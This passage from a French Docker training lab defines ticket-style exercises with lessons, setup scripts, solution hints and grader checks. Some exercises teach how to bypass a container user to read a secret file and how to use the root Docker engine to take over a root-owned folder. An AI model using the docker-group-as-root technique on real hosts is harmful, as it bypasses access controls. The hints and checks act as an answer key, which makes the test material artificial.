             "desc": "Le contenu de <code>/secret/cle.txt</code> du conteneur <code>coffre</code> dans <code>~/cle-coffre.txt</code> ; <code>coffre</code> n'a été ni arrêté, ni redémarré, ni recréé.",
             "hints": ["« Permission denied » ? <code>docker exec</code> lance la commande avec l'utilisateur du conteneur. Lequel ? (<code>docker exec coffre id</code>)",
                       "<code>docker exec</code> accepte un autre utilisateur (<code>-u</code>) ; <code>docker cp</code>, lui, passe par le moteur et ignore l'utilisateur du conteneur."],
             "checks": [
                 ('running coffre && [ "$(insp coffre "{{.Id}} {{.State.StartedAt}}")" = "$LAB_COFFRE" ]', "Le conteneur coffre a été arrêté, redémarré ou recréé (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('[ "$(ans $H/cle-coffre.txt)" = "$LAB_CLE" ]', "Ce n'est pas la clé contenue dans le coffre."),
             ]},
            {"id": "D2.4", "points": 3, "title": "Quel environnement ?",
             "ticket": {"from": "thomas", "body": "Le <code>coffre</code> lit une variable d'environnement <code>ENVIRONNEMENT</code>. Marc m'a dit « regarde l'image <code>coffre:1</code>, tout y est », et elle dit <code>production</code>. Mais les tests de la préprod passent par lui… Quelle valeur l'application voit-elle <strong>vraiment</strong> ?"},
             "desc": "La valeur de <code>ENVIRONNEMENT</code> telle que la voit le processus du conteneur <code>coffre</code> dans <code>~/env-coffre.txt</code>.",
             "hints": ["L'image donne des valeurs par défaut ; le lancement du conteneur peut les remplacer. Interrogez le conteneur, pas l'image.",
                       "<code>docker inspect -f '{{.Config.Env}}' coffre</code>, ou directement <code>docker exec coffre printenv ENVIRONNEMENT</code>."],
             "checks": [
                 ('a=$(ans $H/env-coffre.txt); [ "${a#ENVIRONNEMENT=}" = "$LAB_ENV" ]', "Ce n'est pas la valeur de ENVIRONNEMENT vue par le conteneur coffre."),
             ]},
            {"id": "D2.5", "points": 3, "title": "Qui mange la machine ?",
             "ticket": {"from": "sophie", "body": "Le serveur rame. Parmi les quatre workers de Marc (<code>worker-a</code> à <code>worker-d</code>), l'un d'eux consomme beaucoup plus de mémoire que les autres. Lequel ?"},
             "desc": "<code>~/gourmand.txt</code> contient le nom du worker qui consomme le plus de mémoire.",
             "hints": ["Une commande Docker affiche en direct la consommation de chaque conteneur (CPU, mémoire, réseau…).",
                       "<code>docker stats</code> ; avec <code>--no-stream</code>, un seul relevé au lieu d'un affichage continu."],
             "checks": [
                 ('[ "$(ans $H/gourmand.txt)" = "$LAB_GOURMAND" ]', "Ce n'est pas le worker qui consomme le plus de mémoire."),
             ]},
            {"id": "D2.6", "points": 4, "title": "Une laisse sans redémarrer",
             "ticket": {"from": "lea", "body": "On ne peut pas couper ce worker gourmand : il est au milieu d'un calcul. Limite-le à <strong>128 Mo</strong> de mémoire (sans swap) et à <strong>un demi-CPU</strong>, sans le recréer ni le redémarrer."},
             "desc": "Le worker gourmand est limité à 128 Mo de mémoire et 0,5 CPU ; il n'a été ni recréé, ni redémarré.",
             "hints": ["Certaines options de <code>docker run</code> se modifient sur un conteneur qui tourne.",
                       "<code>docker update</code> avec <code>--memory</code> et <code>--cpus</code>. Lisez bien le message d'erreur : la limite « mémoire + swap » doit être modifiée en même temps (<code>--memory-swap</code>, même valeur : pas de swap)."],
             "checks": [
                 ('[ -n "$LAB_GOURMAND" ] && running "$LAB_GOURMAND" && [ "$(insp "$LAB_GOURMAND" "{{.Id}} {{.State.StartedAt}}")" = "$LAB_WORKER" ]', "Le worker gourmand a été arrêté, redémarré ou recréé (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('[ "$(insp "$LAB_GOURMAND" "{{.HostConfig.Memory}}")" = 134217728 ]', "La mémoire du worker gourmand n'est pas limitée à 128 Mo (docker inspect -f '{{.HostConfig.Memory}}')."),
                 ('[ "$(insp "$LAB_GOURMAND" "{{.HostConfig.MemorySwap}}")" = 134217728 ]', "Le worker gourmand peut encore utiliser du swap : la limite mémoire + swap doit aussi valoir 128 Mo."),
                 ('[ "$(insp "$LAB_GOURMAND" "{{.HostConfig.NanoCpus}}")" = 500000000 ]', "Le worker gourmand n'est pas limité à un demi-CPU."),
             ]},
            {"id": "D2.7", "points": 5, "title": "Parler au processus principal",
             "ticket": {"from": "diallo", "body": "Le programme de caisse (<code>caisse</code>) attend ses ordres sur son <strong>entrée standard</strong>. Il faut lui envoyer l'ordre <code>CLOTURE</code> pour clôturer la journée : il répond alors avec le ticket de clôture. Surtout, ne l'arrête pas : il doit encaisser demain !"},
             "desc": "<code>caisse</code> a reçu l'ordre <code>CLOTURE</code> et affiché son ticket de clôture dans ses journaux ; il tourne toujours, sans avoir été redémarré.",
             "hints": ["<code>docker exec</code> lance un <strong>nouveau</strong> processus, avec sa propre entrée standard : la caisse ne le verra jamais. Il faut se brancher sur le terminal du processus principal.",
                       "<code>docker attach caisse</code>, tapez <code>CLOTURE</code> puis Entrée, et détachez-vous avec <strong>Ctrl+P puis Ctrl+Q</strong>. Lisez ensuite <code>docker logs caisse</code>."],
             "checks": [
                 ('running caisse && [ "$(insp caisse "{{.Id}} {{.State.StartedAt}}")" = "$LAB_CAISSE" ]', "caisse a été arrêté, redémarré ou recréé (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('l=$(docker logs caisse 2>&1 | tr -d "\\r"); e=$(echo "$l" | sed -n "s/.*empreinte du code de clôture : \\([0-9a-f]*\\).*/\\1/p" | head -1); for c in $(echo "$l" | sed -n "s/^Clôture : ticket //p"); do [ "$(printf %s "$c" | sha256sum | cut -c1-16)" = "$e" ] && exit 0; done; exit 1', "La caisse n'a pas affiché de ticket de clôture valide : l'ordre CLOTURE doit arriver sur l'entrée standard de son processus principal."),
             ]},
            {"id": "D2.8", "points": 3, "title": "La facture du conteneur arrêté",
             "ticket": {"from": "diallo", "body": "Le générateur de factures (<code>generateur-factures</code>) a produit la facture de mars, puis il s'est arrêté. J'en ai besoin dans <code>~/factures/</code>. Je ne connais même pas le nom du fichier…"},
             "desc": "La facture produite par <code>generateur-factures</code>, intacte, dans <code>~/factures/</code> ; le conteneur existe toujours.",
             "hints": ["Un conteneur arrêté refuse <code>docker exec</code>… mais son système de fichiers existe toujours. Qu'a-t-il écrit, et où ?",
                       "<code>docker diff generateur-factures</code> montre le chemin ; <code>docker cp</code> fonctionne aussi sur un conteneur arrêté."],
             "checks": [
                 ('docker inspect generateur-factures', "generateur-factures a été supprimé (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('find $H/factures -type f -name "facture-*" -exec sha256sum {} + 2>/dev/null | grep -q "^$LAB_FACTURE "', "La facture de mars n'est pas dans ~/factures/ (ou elle a été modifiée)."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    3: {
        "title": "Jour 3 — La vitrine en ligne",
        "description": "Rendre un service accessible et lui donner des fichiers. Compétences : -p (et sur quelle interface), bind mount de dossier ou de fichier, droits et UID.",
        "lesson": """<h3>Publier un port</h3><p>Un conteneur a son propre réseau : ses ports ne sont pas joignables depuis l'hôte… sauf si on les <strong>publie</strong>.</p><pre>docker run -d --name demo -p 9000:80 nginx:alpine<br>#                            hôte:conteneur<br>curl http://localhost:9000<br>docker port demo                          # ports publiés, et sur quelle adresse<br>docker ps --filter publish=9000           # qui publie ce port ?</pre><ul><li>Deux conteneurs ne peuvent pas publier le même port de l'hôte : « port is already allocated ».</li><li>On ne change pas les ports d'un conteneur existant : on le <strong>recrée</strong>.</li><li>Par défaut, le port est ouvert sur <strong>toutes</strong> les interfaces de l'hôte. <code>-p</code> accepte aussi une adresse IP devant le port de l'hôte, pour n'écouter que sur celle-ci.</li></ul><h3>Monter un dossier de l'hôte (bind mount)</h3><pre>docker run -d --name demo-doc -p 9001:80 \\<br>  -v ~/documentation:/usr/share/nginx/html:ro \\<br>  nginx:alpine</pre><ul><li>Le dossier de l'hôte est <strong>partagé</strong> avec le conteneur : une modification est visible immédiatement, sans rien reconstruire.</li><li><code>:ro</code> (<em>read-only</em>) : le conteneur ne peut pas modifier les fichiers.</li><li>Le chemin de l'hôte commence par <code>/</code> (ou <code>./</code>, depuis Docker 23). Attention : <code>-v documentation:/…</code>, sans <code>/</code> ni <code>./</code>, ne monte pas votre dossier… mais un <strong>volume</strong> nommé « documentation », vide !</li><li>On peut aussi monter un <strong>fichier</strong> seul : <code>-v ~/conf/app.conf:/etc/app.conf:ro</code>.</li></ul><p>Syntaxe longue équivalente : <code>--mount type=bind,src=/home/etudiant/documentation,dst=/usr/share/nginx/html,readonly</code> (elle refuse un chemin qui n'existe pas, là où <code>-v</code> crée un dossier vide).</p><h3>Droits et utilisateurs</h3><p>Un bind mount garde les droits de l'hôte, en <strong>numéros</strong> (UID, GID). Dans le conteneur, chaque processus a son propre utilisateur : le processus principal de nginx tourne en root, mais ses processus de travail, ceux qui lisent les fichiers, sous l'utilisateur <code>nginx</code>.</p><pre>docker top demo-doc                  # utilisateurs des processus<br>docker exec demo-doc id nginx<br>ls -ln ~/documentation               # propriétaires et droits, en numéros</pre>""",
        "setup": r'''
images_de_base
livrer site
arreter_jour 1
arreter dormeur
L="--label lab.jour=3"
# D3.3 : un conteneur oublié occupe le port 8086 et sert une page qui n'existe que dans sa couche inscriptible
nettoyer D3.3
docker rm -f vitrine-promo >/dev/null 2>&1 || true
nom=$(rword); jeton="PROMO-$(hexa 4)"
docker run -d --name $nom $L --label lab.exercice=D3.3 -p 8086:80 nginx:alpine >/dev/null
f=$(mktemp); printf '<h1>Vente flash</h1>\n<p>Code %s</p>\n' "$jeton" > $f; chmod 644 $f
docker cp $f $nom:/usr/share/nginx/html/index.html >/dev/null; rm -f $f
emit NOM "$nom"
emit JETON "$jeton"
# D3.5 : un fichier de configuration monté seul, puis modifié avec sed -i (nouveau fichier, nouvel inode)
docker rm -f maintenance >/dev/null 2>&1 || true
mkdir -p $P/maintenance
ancien=$(rword); nouveau=$(rword); while [ "$nouveau" = "$ancien" ]; do nouveau=$(rword); done
cat > $P/maintenance/default.conf <<EOF
# Page de maintenance de la boutique
server {
    listen 80;
    default_type text/plain;
    location / {
        return 503 "Boutique en maintenance : $ancien\n";
    }
}
EOF
own $P/maintenance
docker run -d --name maintenance $L -p 8089:80 -v $P/maintenance/default.conf:/etc/nginx/conf.d/default.conf:ro nginx:alpine >/dev/null
for _ in $(seq 1 20); do curl -s --max-time 2 localhost:8089 | grep -q "$ancien" && break; sleep 0.5; done
sed -i "s/$ancien/$nouveau/" $P/maintenance/default.conf
own $P/maintenance
docker exec maintenance nginx -s reload >/dev/null 2>&1 || true
emit NOUVEAU "$nouveau"
# D3.6 : des fichiers illisibles pour les processus de travail de nginx
docker rm -f intranet >/dev/null 2>&1 || true
mkdir -p $P/intranet
jeton_intra="INTRA-$(hexa 4)"
printf '<h1>Intranet Cimes &amp; Sentiers</h1>\n<p>Planning des équipes : %s</p>\n' "$jeton_intra" > $P/intranet/index.html
own $P/intranet
chmod 750 $P/intranet; chmod 600 $P/intranet/index.html
docker run -d --name intranet $L -p 8091:80 -v $P/intranet:/usr/share/nginx/html:ro nginx:alpine >/dev/null
emit INTRA "$jeton_intra"
''',
        "exercises": [
            {"id": "D3.1", "points": 3, "title": "Un serveur web en 10 secondes",
             "ticket": {"from": "thomas", "body": "Il me faut un serveur web vite fait pour une démo : un nginx, accessible sur le port <strong>8080</strong> de la machine, nommé <code>vitrine</code>, qui tourne en arrière-plan."},
             "desc": "Un conteneur <code>vitrine</code> (image <code>nginx:alpine</code>) qui répond sur <code>http://localhost:8080</code>.",
             "hints": ["Le conteneur a son propre réseau : il faut publier un de ses ports sur la machine. Sur quel port nginx écoute-t-il dans le conteneur ?",
                       "<code>-p port_hôte:port_conteneur</code> ; nginx écoute sur le port 80. Testez avec <code>curl localhost:8080</code>."],
             "checks": [
                 ('running vitrine', "Le conteneur vitrine ne tourne pas."),
                 ('insp vitrine "{{.Config.Image}}" | grep -q "^nginx"', "vitrine doit utiliser l'image nginx:alpine."),
                 ('http 8080 / | grep -qi nginx', "Rien ne répond sur http://localhost:8080 (port publié ?)."),
             ]},
            {"id": "D3.2", "points": 5, "title": "Le vrai site",
             "ticket": {"from": "sophie", "body": "Le site vitrine est dans <code>~/projet/site</code>. Sers-le sur le port <strong>8081</strong> avec un conteneur <code>vitrine-site</code>. Thomas doit pouvoir modifier le HTML sans rien reconstruire, et le serveur web ne doit surtout pas pouvoir modifier les fichiers."},
             "desc": "<code>vitrine-site</code> sert <code>~/projet/site</code> sur le port 8081 grâce à un <strong>bind mount en lecture seule</strong> sur <code>/usr/share/nginx/html</code>.",
             "hints": ["Plutôt que copier le site dans le conteneur, partagez le dossier avec lui : un montage « bind », en lecture seule.",
                       "<code>-v chemin_hôte:chemin_conteneur:ro</code>, avec un chemin hôte qui commence par <code>/</code> (<code>~</code> est remplacé par votre shell). Testez : modifiez <code>index.html</code>, puis <code>curl localhost:8081</code>."],
             "checks": [
                 ('running vitrine-site', "Le conteneur vitrine-site ne tourne pas."),
                 ('http 8081 / | grep -q "Cimes"', "http://localhost:8081 ne sert pas le site de la boutique."),
                 ('insp vitrine-site "{{range .Mounts}}{{.Type}} {{.Source}} {{.Destination}} {{.RW}}{{println}}{{end}}" | grep -qx "bind /home/etudiant/projet/site /usr/share/nginx/html false"', "Le dossier ~/projet/site doit être monté (bind) en lecture seule sur /usr/share/nginx/html."),
                 ('t=$RANDOM$RANDOM; echo "$t" > $P/site/.verif.html; r=$(http 8081 /.verif.html); rm -f $P/site/.verif.html; [ "$r" = "$t" ]', "Une modification du dossier n'est pas visible immédiatement dans le conteneur."),
             ]},
            {"id": "D3.3", "points": 5, "title": "Port déjà pris",
             "ticket": {"from": "thomas", "body": "Je veux lancer la vitrine promo (<code>vitrine-promo</code>, nginx avec <code>~/projet/site</code>) sur le port <strong>8086</strong>, et Docker me répond « port is already allocated ». Trouve qui squatte ce port et déplace-le sur <strong>8087</strong> : même nom, et surtout <strong>la même page</strong>, c'est une vente flash en cours ! Puis lance ma vitrine promo sur 8086."},
             "desc": "Le conteneur qui occupait 8086 porte toujours le même nom, publie 8087 et sert toujours sa page ; <code>vitrine-promo</code> sert <code>~/projet/site</code> sur 8086.",
             "hints": ["Qui publie ce port ? <code>docker ps</code> a une colonne PORTS, et un filtre. On ne change pas les ports d'un conteneur : il faut le recréer… et sa page, où est-elle ?",
                       "<code>docker ps --filter publish=8086</code> ; <code>docker diff</code> montre que la page a été déposée dans sa couche inscriptible : sauvez-la (<code>docker cp</code>) avant <code>docker rm -f</code>, recréez-le avec <code>-p 8087:80</code>, puis remettez la page."],
             "checks": [
                 ('running "$LAB_NOM"', "Le conteneur qui occupait le port 8086 (même nom) ne tourne pas."),
                 ('docker port "$LAB_NOM" 80/tcp | grep -q ":8087$"', "Le conteneur qui occupait 8086 doit maintenant publier le port 8087."),
                 ('http 8087 / | grep -q "$LAB_JETON"', "http://localhost:8087 ne sert plus la page de la vente flash : elle était dans la couche inscriptible de l'ancien conteneur."),
                 ('running vitrine-promo && docker port vitrine-promo 80/tcp | grep -q ":8086$"', "vitrine-promo doit tourner et publier le port 8086."),
                 ('http 8086 / | grep -q "Cimes"', "http://localhost:8086 ne sert pas le site de la boutique (~/projet/site)."),
             ]},
            {"id": "D3.4", "points": 3, "title": "Visible seulement depuis la machine",
             "ticket": {"from": "sophie", "body": "La console d'administration (<code>admin-console</code>, un nginx) doit répondre sur le port <strong>8088</strong>, mais <strong>uniquement</strong> depuis le serveur lui-même : jamais depuis le réseau. On y accédera par un tunnel SSH."},
             "desc": "<code>admin-console</code> (nginx:alpine) répond sur <code>http://localhost:8088</code>, et son port n'est publié que sur l'adresse 127.0.0.1.",
             "hints": ["Sur quelle(s) adresse(s) de la machine un port publié écoute-t-il par défaut ? <code>-p</code> sait en choisir une.",
                       "<code>-p 127.0.0.1:8088:80</code> ; vérifiez avec <code>docker port admin-console</code>."],
             "checks": [
                 ('running admin-console', "Le conteneur admin-console ne tourne pas."),
                 ('http 8088 / | grep -qi nginx', "http://localhost:8088 ne répond pas."),
                 ('[ "$(docker port admin-console 80/tcp)" = "127.0.0.1:8088" ]', "Le port 8088 de admin-console doit être publié uniquement sur 127.0.0.1 (docker port admin-console)."),
                 ('! curl -s --max-time 3 "http://$(hostname -i | awk \'{print $1}\'):8088/" >/dev/null', "admin-console répond encore depuis le réseau (adresse IP externe de la machine)."),
             ]},
            {"id": "D3.5", "points": 5, "title": "La configuration qui ne se met pas à jour",
             "ticket": {"from": "thomas", "body": "J'ai monté <strong>uniquement</strong> le fichier <code>~/projet/maintenance/default.conf</code> dans le conteneur <code>maintenance</code> (port 8089). J'ai changé le message avec <code>sed -i</code>, puis <code>docker exec maintenance nginx -s reload</code> : rien ne change ! Je veux que le message actuel du fichier soit servi, et que mes prochaines modifications passent avec un simple <code>nginx -s reload</code>, quel que soit l'éditeur."},
             "desc": "<code>maintenance</code> sert le message actuel de <code>~/projet/maintenance/default.conf</code> sur le port 8089, et une modification du fichier (même en le remplaçant) est prise en compte par <code>nginx -s reload</code>.",
             "hints": ["Comparez ce que voit le conteneur (<code>docker exec maintenance cat /etc/nginx/conf.d/default.conf</code>) et le fichier de l'hôte. <code>ls -i</code> avant et après un <code>sed -i</code> : que fait <code>sed -i</code> au fichier ?",
                       "Un bind mount de <strong>fichier</strong> reste attaché au fichier d'origine (son inode) ; <code>sed -i</code> et la plupart des éditeurs en créent un nouveau. Montez plutôt le <strong>dossier</strong> sur <code>/etc/nginx/conf.d</code> (conteneur à recréer)."],
             "checks": [
                 ('running maintenance', "Le conteneur maintenance ne tourne pas."),
                 ('curl -s --max-time 5 localhost:8089/ | grep -q "$LAB_NOUVEAU"', "http://localhost:8089 ne sert pas le message actuel de ~/projet/maintenance/default.conf."),
                 (r'''f=$P/maintenance/default.conf; cp -p "$f" /tmp/lab-maint.bak; t=verif-$RANDOM$RANDOM
printf 'server {\n    listen 80;\n    default_type text/plain;\n    location / { return 503 "%s\\n"; }\n}\n' "$t" > "$f.lab"; chown etudiant:etudiant "$f.lab"; mv "$f.lab" "$f"
docker exec maintenance nginx -s reload >/dev/null 2>&1; sleep 1; r=$(curl -s --max-time 5 localhost:8089/)
cp -p /tmp/lab-maint.bak "$f.lab"; mv "$f.lab" "$f"; rm -f /tmp/lab-maint.bak; docker exec maintenance nginx -s reload >/dev/null 2>&1
echo "$r" | grep -q "$t"''', "Après remplacement du fichier default.conf (comme le fait sed -i) et nginx -s reload, le nouveau message n'est pas servi : le conteneur voit-il encore l'ancien fichier ?"),
             ]},
            {"id": "D3.6", "points": 5, "title": "403 alors que le fichier existe",
             "ticket": {"from": "thomas", "body": "J'ai monté <code>~/projet/intranet</code> dans le conteneur <code>intranet</code> (port 8091), et nginx répond 403 ! Les fichiers sont bien là, j'ai vérifié. Corrige, mais <strong>sans</strong> faire tourner nginx en root, et sans me mettre les droits en 777, Sophie me tuerait."},
             "desc": "<code>http://localhost:8091</code> sert <code>~/projet/intranet/index.html</code> ; aucun fichier du dossier n'est modifiable par « les autres » ; les processus de travail de nginx ne tournent pas en root.",
             "hints": ["<code>docker logs intranet</code> : « Permission denied ». Qui essaie de lire le fichier (<code>docker top intranet</code>), et que disent les droits (<code>ls -ln ~/projet/intranet</code>) ?",
                       "Les processus de travail de nginx n'ont ni votre UID ni votre groupe : ils relèvent des droits des « autres ». Il leur faut la lecture (<code>r</code>) sur les fichiers et la traversée (<code>x</code>) sur le dossier : <code>chmod</code> 644 et 755. Inutile de recréer le conteneur."],
             "checks": [
                 ('running intranet', "Le conteneur intranet ne tourne pas."),
                 ('insp intranet "{{range .Mounts}}{{.Source}} {{.Destination}}{{println}}{{end}}" | grep -qx "/home/etudiant/projet/intranet /usr/share/nginx/html"', "intranet doit toujours servir ~/projet/intranet monté sur /usr/share/nginx/html."),
                 ('http 8091 / | grep -q "$LAB_INTRA"', "http://localhost:8091 ne sert pas l'intranet (403 ?)."),
                 ('[ -z "$(find $P/intranet -perm -o+w)" ]', "Des fichiers ou dossiers de ~/projet/intranet sont modifiables par tout le monde : pas de 777 !"),
                 ('docker exec intranet ps -o user,args | grep "nginx: worker" | grep -vq "^ *root"', "Les processus de travail de nginx tournent en root : ce n'est pas la solution attendue."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    4: {
        "title": "Jour 4 — Des données qui survivent",
        "description": "Volumes nommés, sauvegarde, et le moteur qui tourne en root. Compétences : docker volume, -v volume:/chemin, conteneurs jetables, propriétaires des fichiers.",
        "lesson": """<h3>Le problème</h3><p>Tout ce qu'un conteneur écrit dans sa couche inscriptible disparaît avec <code>docker rm</code>. Une base de données doit donc écrire ailleurs.</p><h3>Les volumes</h3><pre>docker volume create demo-data<br>docker volume ls<br>docker run -d --name demo-db -v demo-data:/data redis:7-alpine redis-server --appendonly yes</pre><ul><li>Un <strong>volume</strong> est géré par Docker (dans <code>/var/lib/docker/volumes</code>), indépendant de tout conteneur.</li><li>On peut supprimer le conteneur, en recréer un autre sur le même volume : les données sont là.</li><li><code>--appendonly yes</code> : Redis écrit chaque modification sur disque (sinon, seulement de temps en temps).</li></ul><pre>docker exec demo-db redis-cli set essai 42<br>docker exec demo-db redis-cli get essai</pre><h3>Les conteneurs jetables</h3><p>Un conteneur lancé avec <code>--rm</code> est supprimé dès qu'il se termine : parfait pour une tâche ponctuelle. Il peut monter <strong>plusieurs</strong> volumes ou dossiers à la fois, par exemple pour archiver un volume dans un dossier de l'hôte :</p><pre>docker run --rm -v demo-data:/source -v ~/archives:/dest alpine \\<br>  tar czf /dest/demo-data.tar.gz -C /source .</pre><h3>Le moteur Docker est root</h3><ul><li>Le moteur (<code>dockerd</code>) tourne en root, comme la plupart des conteneurs. Un dossier de l'hôte absent au moment d'un <code>-v</code> est créé par le moteur… donc par root.</li><li>Les fichiers écrits dans un bind mount appartiennent à l'UID du processus qui les écrit : root, ou l'utilisateur du service (999 pour Redis, 101 pour nginx…). Certaines images changent aussi, au démarrage, le propriétaire de leur dossier de données.</li><li>Quiconque pilote le moteur peut monter n'importe quel dossier de l'hôte dans un conteneur qui tourne en root : <strong>appartenir au groupe <code>docker</code>, c'est avoir les droits de root</strong>.</li></ul>""",
        "setup": r'''
images_de_base
arreter_jour 2
# D4.3 : un dossier de l'hôte monté dans Redis… qui en a changé le propriétaire
docker rm -f lab-prep-redis >/dev/null 2>&1 || true
rm -rf $H/redis-local
inv="INV-$(hexa 4)"
docker run -d --name lab-prep-redis -v $H/redis-local:/data redis:7-alpine >/dev/null
attendre_redis lab-prep-redis
docker exec lab-prep-redis redis-cli set inventaire "$inv" >/dev/null
docker exec lab-prep-redis redis-cli save >/dev/null
docker rm -f lab-prep-redis >/dev/null
docker run --rm -v $H/redis-local:/d alpine chmod 700 /d
emit INVENTAIRE "$inv"
# D4.4 : un volume à « renommer »
docker rm -f stock lab-prep-stock >/dev/null 2>&1 || true
docker volume rm stock-2024 stock-archive >/dev/null 2>&1 || true
docker run -d --name lab-prep-stock -v stock-2024:/data redis:7-alpine >/dev/null
attendre_redis lab-prep-stock
for i in $(seq 1 150); do echo "SET article:$i $((RANDOM % 500))"; done | docker exec -i lab-prep-stock redis-cli >/dev/null
k1=$((RANDOM % 75 + 1)); k2=$((RANDOM % 75 + 76))
emit K1 "article:$k1 $(docker exec lab-prep-stock redis-cli get article:$k1)"
emit K2 "article:$k2 $(docker exec lab-prep-stock redis-cli get article:$k2)"
docker exec lab-prep-stock redis-cli save >/dev/null
docker rm -f lab-prep-stock >/dev/null
''',
        "exercises": [
            {"id": "D4.1", "points": 5, "title": "Un cache persistant",
             "ticket": {"from": "thomas", "body": "On veut un Redis pour la boutique, mais la dernière fois tout a été perdu à la mise à jour. Crée un volume <code>donnees-boutique</code>, lance un conteneur <code>cache</code> (redis:7-alpine) qui y stocke ses données (<code>/data</code>) avec la persistance activée, puis enregistre la clé <code>promo</code> = <code>RANDO10</code>."},
             "desc": "Volume <code>donnees-boutique</code> monté sur <code>/data</code> du conteneur <code>cache</code> ; la clé <code>promo</code> vaut <code>RANDO10</code> et est écrite sur le volume.",
             "hints": ["Trois choses : un volume, un conteneur Redis qui le monte sur <code>/data</code>, et Redis configuré pour écrire chaque modification sur disque. La clé s'écrit avec <code>redis-cli</code>, dans le conteneur.",
                       "Les arguments écrits après le nom de l'image remplacent la commande par défaut : <code>redis-server --appendonly yes</code>. Puis <code>docker exec cache redis-cli set …</code>."],
             "checks": [
                 ('docker volume inspect donnees-boutique', "Le volume donnees-boutique n'existe pas."),
                 ('running cache', "Le conteneur cache ne tourne pas."),
                 ('insp cache "{{range .Mounts}}{{.Type}} {{.Name}} {{.Destination}}{{println}}{{end}}" | grep -qx "volume donnees-boutique /data"', "Le volume donnees-boutique doit être monté sur /data dans le conteneur cache."),
                 ('[ "$(docker exec cache redis-cli get promo)" = RANDO10 ]', "La clé promo ne vaut pas RANDO10 dans Redis."),
                 ('docker run --rm -v donnees-boutique:/data alpine grep -rqs RANDO10 /data', "La donnée n'est pas encore écrite sur le volume : activez la persistance (--appendonly yes)."),
             ]},
            {"id": "D4.2", "points": 3, "title": "Sauvegarde du volume",
             "ticket": {"from": "sophie", "body": "Règle d'or : pas de données sans sauvegarde. Archive le contenu du volume <code>donnees-boutique</code> dans <code>~/sauvegardes/donnees-boutique.tar.gz</code>."},
             "desc": "<code>~/sauvegardes/donnees-boutique.tar.gz</code> contient les fichiers du volume, dont les données Redis (la clé <code>promo</code>).",
             "hints": ["Le volume n'est pas un dossier que vous pouvez lire directement : un conteneur jetable peut monter à la fois le volume et un dossier de votre machine, puis lancer <code>tar</code>.",
                       "Deux <code>-v</code> sur le même <code>docker run --rm … alpine tar czf …</code> ; <code>-C</code> choisit le dossier à archiver. Le chemin de votre dossier de sauvegarde doit être absolu."],
             "checks": [
                 ('gzip -t $H/sauvegardes/donnees-boutique.tar.gz', "~/sauvegardes/donnees-boutique.tar.gz est absent ou n'est pas une archive gzip."),
                 ('tar -tzf $H/sauvegardes/donnees-boutique.tar.gz | grep -qE "appendonly|dump\\.rdb"', "L'archive ne contient pas les données Redis du volume."),
                 ('tar -xzOf $H/sauvegardes/donnees-boutique.tar.gz 2>/dev/null | grep -aq RANDO10', "L'archive ne contient pas la clé promo : a-t-elle été faite avant l'écriture de la clé ?"),
             ]},
            {"id": "D4.3", "points": 5, "title": "Mon dossier ne m'appartient plus",
             "ticket": {"from": "thomas", "body": "J'ai lancé Redis avec <code>-v ~/redis-local:/data</code> pour voir ses fichiers de près. Résultat : je ne peux même plus lister <strong>mon</strong> dossier (<code>ls ~/redis-local</code> : « Permission denied ») ! Rends-le-moi, avec tout son contenu à mon nom, sans perdre les données. Et on n'a pas le mot de passe root, évidemment."},
             "desc": "<code>~/redis-local</code> et tout son contenu appartiennent à <code>etudiant</code> ; les données Redis (<code>dump.rdb</code>, avec la clé <code>inventaire</code>) sont intactes.",
             "hints": ["<code>ls -ld ~/redis-local</code> : à qui appartient-il ? Vous n'êtes pas root… mais le moteur Docker, lui, l'est. Et vous le pilotez.",
                       "Un conteneur jetable qui monte le dossier peut faire <code>chown -R</code> vers vos numéros d'utilisateur et de groupe (<code>id -u</code>, <code>id -g</code>)."],
             "checks": [
                 ('[ -d $H/redis-local ] && [ -z "$(find $H/redis-local ! -user etudiant 2>/dev/null)" ]', "~/redis-local (ou un fichier qu'il contient) n'appartient pas à etudiant."),
                 ('grep -aq "$LAB_INVENTAIRE" $H/redis-local/dump.rdb', "Les données Redis de ~/redis-local ont été perdues (dump.rdb) : bouton « Réinitialiser les fichiers de cette étape » pour recommencer."),
             ]},
            {"id": "D4.4", "points": 4, "title": "Renommer un volume",
             "ticket": {"from": "lea", "body": "Nouvelle convention de nommage : le volume <code>stock-2024</code> doit s'appeler <code>stock-archive</code>. Lance un Redis <code>stock</code> dessus, avec <strong>toutes</strong> les données (150 articles), et supprime l'ancien nom."},
             "desc": "Le volume <code>stock-2024</code> n'existe plus ; le conteneur <code>stock</code> (redis:7-alpine) monte <code>stock-archive</code> sur <code>/data</code> et y retrouve les 150 articles.",
             "hints": ["Aucune commande ne renomme un volume. Mais un conteneur jetable peut monter deux volumes à la fois…",
                       "<code>docker run --rm -v ancien:/de -v nouveau:/vers alpine cp -a /de/. /vers/</code>, puis Redis sur le nouveau volume, et enfin <code>docker volume rm</code> de l'ancien."],
             "checks": [
                 ('running stock', "Le conteneur stock ne tourne pas."),
                 ('insp stock "{{range .Mounts}}{{.Type}} {{.Name}} {{.Destination}}{{println}}{{end}}" | grep -qx "volume stock-archive /data"', "Le volume stock-archive doit être monté sur /data dans le conteneur stock."),
                 ('[ "$(docker exec stock redis-cli dbsize)" = 150 ]', "Le Redis stock ne contient pas les 150 articles de stock-2024."),
                 ('set -- $LAB_K1 && [ "$(docker exec stock redis-cli get $1)" = "$2" ] && set -- $LAB_K2 && [ "$(docker exec stock redis-cli get $1)" = "$2" ]', "Les articles du Redis stock n'ont pas les valeurs de stock-2024 : copiez les données, ne les recréez pas."),
                 ('! docker volume inspect stock-2024 >/dev/null 2>&1', "L'ancien volume stock-2024 existe encore."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    5: {
        "title": "Jour 5 — Volumes, bind mounts, tmpfs : les pièges",
        "description": "Ce que Docker fait vraiment des données. Compétences : volume pré-rempli, restauration, volumes anonymes, filtres et labels, --read-only, --tmpfs.",
